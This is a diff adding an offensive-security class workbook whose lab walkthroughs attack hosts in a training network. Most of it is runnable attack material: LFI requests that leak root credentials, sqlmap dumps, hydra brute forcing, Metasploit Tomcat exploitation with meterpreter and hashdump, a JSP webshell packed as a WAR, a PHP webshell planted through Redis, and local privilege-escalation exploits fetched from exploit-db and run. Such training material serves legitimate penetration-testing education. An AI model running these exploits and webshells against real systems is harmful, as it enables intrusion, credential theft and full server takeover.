@@ -1,0 +1,1624 @@
+########################################################
+# CyberWar: Advanced Offensive Cyber Operations        #
+# By Joe McCray of Strategic Security                  #
+########################################################
+
+
+
+#########################
+# Class Virtual Machine #
+#########################
+ 
+ 
+Here is the VMWare virtual machine for the class or you can use Kali Linux as well if you like:
+ 
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Ubuntu-17-10-InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+
+
+Let's have you connect to the VPN. I wanted to make sure that I did some of the stuff on my local virtual machines because I want you to do the hunting for vulnerable hosts to attack.
+
+
+To connect to the VPN open a web browser on your host machine (not your virtual machine) and go to the following URL:
+https://54.245.178.32/?src=connect
+
+
+Accept the security exception and enter one of the following user names:
+
+username: labuser001		
+username: labuser002
+username: labuser003
+username: labuser004
+username: labuser005
+username: labuser006
+username: labuser007
+username: labuser008
+username: labuser009
+username: labuser010
+username: labuser011
+username: labuser012
+username: labuser013
+username: labuser014
+username: labuser015
+username: labuser016
+username: labuser017
+username: labuser018
+username: labuser019
+username: labuser020
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
+Mr. McCray will provide you with the password for the usernames above once the training session starts.
+
+
+
+
+The target network range is:
+172.31.2.0/24
+
+
+You can do any attack EXCEPT man-in-the-middle attacks, and please DO NOT attack any other IP ranges.
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------
+Some tools to install:
+---------------------------Type This-----------------------------------
+wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
+gcc propecia.c -o propecia
+sudo cp propecia /bin
+-----------------------------------------------------------------------
+
+
+
+
+
+Step 1: Portscan the server
+---------------------------Type This-----------------------------------
+sudo nmap -sS 172.31.2.139
+-----------------------------------------------------------------------
+
+Step 2: Version scan the server
+---------------------------Type This-----------------------------------
+sudo nmap -sV -p22,80 172.31.2.139
+-----------------------------------------------------------------------
+
+
+
+Step 3: Vulnerability scan the webserver
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.139
+-----------------------------------------------------------------------
+
+
+
+
+Step 4: Directory brute-force the webserver
+---------------------------Type This-----------------------------------
+cd ~/toolz
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.139 wordlists/big.txt
+-----------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+Attack steps:
+-------------
+ 
+ 
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+
+Found 4 hosts:
+172.31.2.47
+172.31.2.47
+172.31.2.157
+172.31.2.217
+
+
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.47
+-----------------------------------------------------------------------
+
+
+
+PORT    STATE    SERVICE VERSION
+22/tcp  open     ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open     http    Apache httpd 2.2.22 ((Ubuntu))
+514/tcp filtered shell
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.47
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.47 -v | grep -v "404 Not Found"
+-----------------------------------------------------------------------
+
+
+
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+
+
+http://172.31.2.47/test
+http://172.31.2.47/test.php (got the following error message)
+	'file' parameter is empty. Please provide file path in 'file' parameter
+
+Figured this was a Local File Include (LFI) so I tried:
+	http://172.31.2.47/test.php?file=/etc/passwd
+	http://172.31.2.47/test.php?file=/etc/passwd%00
+
+None of these worked so I tried it as a POST request with curl (reference: https://pastebin.com/yfBz5H7b)
+---------------------------Type This-----------------------------------
+curl -X POST -F 'file=/etc/passwd' http://172.31.2.47/test.php
+-----------------------------------------------------------------------
+
+
+
+http://172.31.2.47/a
+http://172.31.2.47/b
+http://172.31.2.47/c  (a and b gave 404 errors, but "c" is a blank page, and view source is blank as well - this must be a config file"
+
+So let's try that POST request with curl to pull down the c.php config file.
+
+---------------------------Type This-----------------------------------
+curl -X POST -F 'file=/var/www/html/c.php' http://172.31.2.47/test.php
+curl -X POST -F 'file=/var/htdocs/c.php' http://172.31.2.47/test.php 
+curl -X POST -F 'file=/var/www/c.php' http://172.31.2.47/test.php
+----------------------------------------------------------------------- 
+
+<?php
+#header( 'Z-Powered-By:its chutiyapa xD' );
+header('X-Frame-Options: SAMEORIGIN');
+header( 'Server:testing only' );
+header( 'X-Powered-By:testing only' );
+
+ini_set( 'session.cookie_httponly', 1 );
+
+$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
+
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "connection failed ->  " . mysqli_connect_error();
+  }
+
+?>
+
+
+
+---------------------------Type This-----------------------------------
+ssh -l billu 172.31.2.47
+	b0x_billu
+-----------------------------------------------------------------------
+
+
+
+http://172.31.2.47/phpmyadmin
+http://172.31.2.47/phpMyAdmin
+http://172.31.2.47/pma
+http://172.31.2.47/phpmy
+
+
+Then I Googled config file name for phpmyadmin (config.inc.php)
+
+---------------------------Type This-----------------------------------
+curl -X POST -F 'file=/var/www/phpmy/config.inc.php' http://172.31.2.47/test.php
+-----------------------------------------------------------------------
+<?php
+
+/* Servers configuration */
+$i = 0;
+
+/* Server: localhost [1] */
+$i++;
+$cfg['Servers'][$i]['verbose'] = 'localhost';
+$cfg['Servers'][$i]['host'] = 'localhost';
+$cfg['Servers'][$i]['port'] = '';
+$cfg['Servers'][$i]['socket'] = '';
+$cfg['Servers'][$i]['connect_type'] = 'tcp';
+$cfg['Servers'][$i]['extension'] = 'mysqli';
+$cfg['Servers'][$i]['auth_type'] = 'cookie';
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'roottoor';
+$cfg['Servers'][$i]['AllowNoPassword'] = true;
+
+
+---------------------------Type This-----------------------------------
+ssh -l root 172.31.2.47
+	roottoor
+-----------------------------------------------------------------------
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Attack steps:
+-------------
+
+
+
+Step 1: Ping sweep the target network
+-------------------------------------
+
+
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+
+
+
+- Found 3 hosts
+172.31.2.64
+172.31.2.217
+172.31.2.238
+
+
+
+Step 2: Port scan target system
+-------------------------------
+
+
+---------------------------Type This-----------------------------------
+nmap -sV 172.31.2.64
+-----------------------------------------------------------------------
+
+
+
+-------------Scan Results--------------------------------------------
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
+514/tcp  filtered shell
+1037/tcp filtered ams
+6667/tcp open     irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+--------------------------------------------------------------------
+
+
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+
+
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.64
+-----------------------------------------------------------------------
+
+
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+
+perl Webr00t.pl -h 172.31.2.64 -v
+-----------------------------------------------------------------------
+
+
+
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+
+
+..... really didn't get much from here so we just opened the web page in a browser
+http://172.31.2.64/
+
+.....browsed to the webpage and saw that it pointed to:
+http://172.31.2.64/jabc
+
+....clicked on documentation link and found hidden text that pointed to here:
+http://172.31.2.64/jabcd0cs/
+
+....saw that the app was OpenDocMan v1.2.7 and found it was vulnerable:
+https://www.exploit-db.com/exploits/32075/
+
+Tried the sql injection described in exploit-db:
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9
+
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,user(),3,4,5,6,7,8,9
+
+
+
+Tried to run sqlmap against the target
+
+
+---------------------------Type This-----------------------------------
+cd sqlmap-dev/
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -b --dbms=mysql
+
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-user --dbms=mysql
+
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-db --dbms=mysql
+
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --dbms=mysql
+
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --users --passwords --dbms=mysql
+-----------------------------------------------------------------------
+
+
+
+FOUND: cracked password 'toor' for user 'drupal7' (sqlmap)
+FOUND: 9CFBBC772F3F6C106020035386DA5BBBF1249A11 hash is 'toor' verified at crackstation.net
+
+
+
+---------------------------Type This-----------------------------------
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs --tables --dbms=mysql
+
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump --dbms=mysql
+-----------------------------------------------------------------------
+
+	username: 	webmin
+	hash:		b78aae356709f8c31118ea613980954b
+
+https://hashkiller.co.uk/md5-decrypter.aspx
+	
+	hash:		b78aae356709f8c31118ea613980954b
+	pass:		webmin1980
+
+
+ok - /phpmyadmin and /webmin both did not work in the browser but these credentials worked for SSH.
+
+
+
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+	webmin1980
+
+id
+
+cat /etc/*release
+-----------------------------------------------------------------------
+
+
+
+....tired of not having a real command shell...
+
+
+---------------------------Type This-----------------------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+
+
+---------------------------Type This----------------------------------- 
+gcc -o boom exploit.c
+ 
+./boom
+-----------------------------------------------------------------------
+
+
+------------exploit failed, damn let's try another one ---------
+
+
+
+---------------------------Type This-----------------------------------
+cat >> exploit2.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+
+
+out
+
+
+gcc -o boom2 exploit2.c
+ 
+./boom2
+
+id
+
+
+......YEAH - do the happy dance!!!!
+
+
+
+
+---- Previous class attack process -------
+
+
+#########################
+# Building a quick list #
+#########################
+
+---------------------------Type This-----------------------------------
+
+cd ~
+echo bob >> list.txt
+echo jim >> list.txt
+echo joe >> list.txt
+echo tim >> list.txt
+echo admin >> list.txt
+echo hello >> list.txt
+echo rob >> list.txt
+echo test >> list.txt
+echo aaaaaa >> list.txt
+echo larry >> list.txt
+echo mario >> list.txt
+echo jason >> list.txt
+echo john >> list.txt
+-----------------------------------------------------------------------
+
+
+###########################################################
+# Let's start with some basic scanning of the lab network #
+###########################################################
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-11-21 13:17 EST
+Nmap scan report for 172.31.2.24
+Host is up (0.046s latency).
+Nmap scan report for 172.31.2.47
+Host is up (0.045s latency).
+Nmap scan report for 172.31.2.64
+Host is up (0.037s latency).
+Nmap scan report for 172.31.2.86
+Host is up (0.040s latency).
+Nmap scan report for 172.31.2.117
+Host is up (0.038s latency).
+Nmap scan report for 172.31.2.139
+Host is up (0.037s latency).
+Nmap scan report for 172.31.2.157
+Host is up (0.036s latency).
+Nmap scan report for 172.31.2.217
+Host is up (0.047s latency).
+Nmap scan report for 172.31.2.238
+Host is up (0.036s latency).
+Nmap done: 256 IP addresses (9 hosts up) scanned in 3.22 seconds
+
+
+
+
+
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ sudo nmap -sS 172.31.2.24
+-----------------------------------------------------------------------
+
+[sudo] password for infosecaddicts:
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-11-21 13:18 EST
+Nmap scan report for 172.31.2.24
+Host is up (1.8s latency).
+Not shown: 989 closed ports
+PORT     STATE    SERVICE
+25/tcp   open     smtp
+80/tcp   open     http
+111/tcp  open     rpcbind
+139/tcp  open     netbios-ssn
+445/tcp  open     microsoft-ds
+514/tcp  filtered shell
+1322/tcp open     novation
+2049/tcp open     nfs
+8080/tcp open     http-proxy
+8081/tcp open     blackice-icecap
+9000/tcp open     cslistener
+
+Nmap done: 1 IP address (1 host up) scanned in 133.56 seconds
+
+
+
+
+
+
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ sudo nmap -sV -p25,80,111,139,445,1322,2049,8080,8081,9000 172.31.2.24
+-----------------------------------------------------------------------
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-11-21 13:21 EST
+Nmap scan report for 172.31.2.24
+Host is up (0.031s latency).
+PORT     STATE SERVICE     VERSION
+25/tcp   open  ftp         vsftpd 3.0.2
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: CANYOUPWNME)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: CANYOUPWNME)
+1322/tcp open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+8081/tcp open  http        Apache httpd 2.4.7 ((Ubuntu))
+9000/tcp open  http        Jetty winstone-2.9
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
+
+
+
+
+
+
+
+
+###########################
+# Day 1: Attacking Kevgir #
+###########################
+
+
+******** Attacking Kevgir ********
+I figured I've give you something fun to play with.
+ 
+ 
+ 
+###############
+# Using Nikto #
+###############
+
+---------------------------Type This-----------------------------------
+ 
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.24
+ 
+perl nikto.pl -h 172.31.2.24:8080
+ 
+perl nikto.pl -h 172.31.2.24:8081
+ 
+perl nikto.pl -h 172.31.2.24:9000
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+####################
+# Using Metasploit #
+####################
+
+---------------------------Type This-----------------------------------
+
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/http/http_version        
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+use auxiliary/scanner/http/tomcat_enum           
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+####################
+# Attacking Tomcat #
+####################
+
+---------------------------Type This-----------------------------------
+
+use auxiliary/scanner/http/http_version        
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+------------------------------- 
+ 
+ 
+use auxiliary/scanner/http/tomcat_mgr_login          
+ 
+set USERNAME tomcat
+ 
+set USERPASS_FILE /home/infosecaddicts/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+use exploit/multi/http/tomcat_mgr_upload
+ 
+set HttpUsername tomcat
+ 
+set HttpPassword tomcat
+ 
+set RHOST 172.31.2.24
+ 
+set RPORT 8080
+ 
+set PATH /manager/html
+ 
+set PAYLOAD java/meterpreter/bind_tcp
+ 
+exploit
+ 
+ 
+run post/linux/gather/checkvm
+ 
+run post/linux/gather/enum_configs
+ 
+run post/linux/gather/enum_protections
+ 
+run post/linux/gather/enum_system
+ 
+run post/linux/gather/enum_users_history
+ 
+run post/linux/gather/hashdump
+ 
+shell
+ 
+/bin/bash
+ 
+id
+ 
+uname -a
+ 
+dpkg -l
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/39166.c
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+gcc -o boom exploit.c
+ 
+./boom
+ 
+id
+ 
+ 
+-----------------------------------------------------------------------
+ 
+---------------------------Type This-----------------------------------
+ 
+hydra -l tomcat -P /home/infosecaddicts/list.txt -e ns -s 8080 -vV 172.31.2.24 http-get /manager/html
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+-------------------------------------------index.jsp-------------------------------------------
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+-------------------------------------------index.jsp-------------------------------------------
+ 
+***** now pack the webshell *****
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+mkdir webshell
+cp index.jsp webshell
+ 
+cd webshell
+jar -cvf ../webshell.war *
+-----------------------------------------------------------------------
+ 
+ 
+Deploy the WAR file using the built-in deploy option on the manager web-page.
+Once the WAR file is deployed I simply browse to the URL I deployed the WAR file
+now upload the webshell.war. After uploading, visit page: http://172.31.2.2:8080/webshell/
+ 
+ 
+ 
+****** This section isn't finished ******
+
+ ---------------------------Type This-----------------------------------
+
+cd ~/toolz/metasploit
+ 
+./msfvenom -p linux/x86/shell_bind_tcp LPORT="7777" -f war > /home/infosecaddicts/bind7777.war
+ 
+jar tf ~/bind7777.war
+-----------------------------------------------------------------------
+ 
+****** This section isn't finished ******
+ 
+Google is your friend hahahahahahahah........
+ 
+ 
+#################
+# Attacking FTP #
+#################
+
+---------------------------Type This-----------------------------------
+
+sudo nmap -sV -Pn -p25 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 172.31.2.24
+ 
+cd ~/toolz/hydra
+ 
+hydra -l admin -P /home/infosecaddicts/list.txt -u -s 25 172.31.2.24 ftp
+ 
+ftp
+open 172.31.2.24
+admin
+admin
+pwd
+ls -lah
+ 
+ls ../../
+-----------------------------------------------------------------------
+ 
+ 
+#################
+# Attacking SSH #
+#################
+
+---------------------------Type This-----------------------------------
+
+sudo apt-get install -y libssh-dev
+     infosecaddicts
+cd ~/toolz/hydra
+make clean
+./configure
+make
+sudo make install
+
+ 
+hydra -L /home/infosecaddicts/list.txt -P /home/infosecaddicts/list.txt -u -s 1322 172.31.2.24 ssh
+ 
+ssh -p 1322 admin@172.31.2.24
+ 
+ 
+------------------------------- 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/ssh/ssh_enumusers          
+ 
+set USER_FILE /home/infosecaddicts/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 1322
+ 
+run
+ 
+ 
+ 
+ 
+ 
+use auxiliary/scanner/ssh/ssh_login          
+ 
+set USER_FILE /home/infosecaddicts/list.txt
+ 
+set PASS_FILE /home/infosecaddicts/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 1322
+ 
+run
+ 
+ 
+sessions -l
+ 
+sessions -u 1
+ 
+sessions -i 1
+ 
+id
+ 
+-----------------------------------------------------------------------
+ 
+ 
+########################
+# Attacking phpMyAdmin #
+########################
+****** This section isn't finished ******
+
+---------------------------Type This-----------------------------------
+ 
+hydra -l root -P /home/infosecaddicts/list.txt -e n http-post-form://172.31.2.24 -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"
+-----------------------------------------------------------------------
+ 
+****** This section isn't finished ******
+ 
+Google is your friend hahahahahahahah........
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+wget https://repo.palkeo.com/repositories/mysterie.fr/prog/darkc0de/others/pmabf.py
+ 
+python pmabf.py http://172.31.2.24 root list.txt        (this gave me the WRONG password)
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+####################
+# Attacking Joomla #
+####################
+
+---------------------------Type This-----------------------------------
+
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use use auxiliary/scanner/http/joomla_plugins            
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+-----------------------------------------------------------------------
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+#####################
+# Attacking Jenkins #
+#####################
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+#################
+# Attacking NFS #
+#################
+
+---------------------------Type This-----------------------------------
+
+sudo apt install -y rpcbind nfs-common
+ 
+rpcinfo -s 172.31.2.24
+ 
+showmount -e 172.31.2.24
+ 
+sudo /bin/bash
+ 
+mkdir /tmp/nfs
+ 
+mount -t nfs 172.31.2.24:/backup /tmp/nfs -o nolock
+ 
+ls /tmp/nfs
+ 
+cp /tmp/nfs/backup.tar.bz2.zip /home/infosecaddicts
+ 
+umount -l /tmp/nfs
+ 
+exit
+ 
+sudo apt-cache search fcrackzip
+ 
+sudo apt-get install -y fcrackzip
+ 
+fcrackzip -u backup.tar.bz2.zip
+ 
+unzip -P aaaaaa backup.tar.bz2.zip
+ 
+tar jxf backup.tar.bz2
+-----------------------------------------------------------------------
+ 
+ 
+###################
+# Attacking Redis #
+###################
+
+---------------------------Type This-----------------------------------
+
+sudo nmap -p 6379 --script=redis-info 172.31.2.24
+    infosecaddicts
+ 
+sudo apt-get install -y redis-tools
+    infosecaddicts
+ 
+redis-cli -h 172.31.2.24
+ 
+CONFIG SET dir /var/www/html/main
+ 
+CONFIG GET dir
+ 
+config set dbfilename boom.php
+ 
+CONFIG GET dbfilename
+ 
+SET cmd "<?php system($_GET['joe']); ?>"
+ 
+BGSAVE
+ 
+http://172.31.2.24/boom.php
+ 
+http://172.31.2.24/boom.php?joe=id
+ 
+ 
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt/.ssh"
+ 
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/redis/file_upload
+ 
+set RHOSTS 172.31.2.24
+ 
+set LocalFile
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+
+
+
+
+
+sudo nmap -sV -p 3260 172.31.2.217
+ 
+ 
+sudo apt install open-iscsi
+ 
+sudo iscsiadm -m discovery -t  st -p 172.31.2.217
+ 
+sudo iscsiadm -m discovery -t  st -p 172.31.2.217:3260
+ 
+sudo iscsiadm -m node -p 172.31.2.217 --login
+ 
+sudo /bin/bash
+ 
+fdisk -l
+    ***** look for /dev/sda5 - Linux swap / Solaris *******
+ 
+mkdir /mnt/217vm
+ 
+mount /dev/sdb /mnt/217vm
+ 
+cd /mnt/217vm
+ 
+ls
+ 
+cat flag1.txt
+ 
+file bobsdisk.dsk
+ 
+mkdir /media/bobsdisk
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+/mnt/217vm# ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+cat ToAlice.eml
+ 
+file bobsdisk.dsk
+ 
+mkdir /media/bobsdisk
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+/mnt/217vm# ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+cat ToAlice.eml
+ 
+file ToAlice.csv.enc
+ 
+file bobsdisk.dsk
+ 
+pwd
+ 
+mkdir /media/bobsdisk
+ 
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+ls
+ 
+cat ToAlice.eml | grep flag
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+ls
+ 
+cat ToAlice.eml
+    ***** look for supercalifragilisticoespialidoso ******
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+    supercalifragilisticoespialidoso
+ 
+ 
+ls
+ 
+cat ToAlice.csv
+-----------------------------------------------------------------------
+ 
+-----------------------------------------------------
+Web Path,Reason
+5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site!
+c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
+flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? What is it?
+ 
+-----------------------------------------------------
+ 
+The hints are "Web Path" and "strangest URL" so let's try the long strings in the URL:
+http://172.31.2.217/5560a1468022758dba5e92ac8f2353c0/
+  -- view source
+ 
+Found this string in the source:
+R2VvcmdlIENvc3RhbnphOiBbU291cCBOYXppIGdpdmVzIGhpbSBhIGxvb2tdIE1lZGl1bSB0dXJr
+ZXkgY2hpbGkuIApbaW5zdGFudGx5IG1vdmVzIHRvIHRoZSBjYXNoaWVyXSAKSmVycnkgU2VpbmZl
+bGQ6IE1lZGl1bSBjcmFiIGJpc3F1ZS4gCkdlb3JnZSBDb3N0YW56YTogW2xvb2tzIGluIGhpcyBi
+YWcgYW5kIG5vdGljZXMgbm8gYnJlYWQgaW4gaXRdIEkgZGlkbid0IGdldCBhbnkgYnJlYWQuIApK
+ZXJyeSBTZWluZmVsZDogSnVzdCBmb3JnZXQgaXQuIExldCBpdCBnby4gCkdlb3JnZSBDb3N0YW56
+YTogVW0sIGV4Y3VzZSBtZSwgSSAtIEkgdGhpbmsgeW91IGZvcmdvdCBteSBicmVhZC4gClNvdXAg
+TmF6aTogQnJlYWQsICQyIGV4dHJhLiAKR2VvcmdlIENvc3RhbnphOiAkMj8gQnV0IGV2ZXJ5b25l
+IGluIGZyb250IG9mIG1lIGdvdCBmcmVlIGJyZWFkLiAKU291cCBOYXppOiBZb3Ugd2FudCBicmVh
+ZD8gCkdlb3JnZSBDb3N0YW56YTogWWVzLCBwbGVhc2UuIApTb3VwIE5hemk6ICQzISAKR2Vvcmdl
+IENvc3RhbnphOiBXaGF0PyAKU291cCBOYXppOiBOTyBGTEFHIEZPUiBZT1UK
+ 
+------ https://www.base64decode.org/ -------
+------ Decoded, but didn't find a flag -----
+ 
+ 
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/
+  -- view source --
+  -- Nothing in source --
+ 
+Browsed to the flag link:
+view-source:http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=flag
+  -- view source --
+  -- Nothing in source --
+ 
+ 
+Tried a PHP base64 decode with the URL:
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=welcome.php
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=party.php
+ 
+------ https://www.base64decode.org/ -------
+Use the string found here:
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+ 
+-------------------------------------------------------------------
